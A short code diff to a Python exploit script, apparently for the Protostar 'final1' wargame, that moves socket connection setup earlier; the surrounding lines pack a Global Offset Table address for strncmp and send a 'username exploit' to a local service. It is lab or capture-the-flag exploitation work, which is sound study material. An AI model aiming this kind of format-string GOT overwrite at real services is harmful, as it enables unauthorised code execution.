@@ -5,6 +5,10 @@ import telnetlib
 HOST = "127.0.0.1"
 PORT = 2994
 
+# Establishes connection
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
 # Address of strncmp function in Global Offset Table
 strncmp1 = struct.pack("I", 0x804a1a8)
 # address of second half of strncmp function
@@ -36,10 +40,6 @@ def read_until(string):
    while string not in buffer:
       buffer += s.recv(1)
    return buffer
-
-# Establishes connection
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((HOST, PORT))
 
 # Sends username exploit to server
 read_until("[final1] $ ")
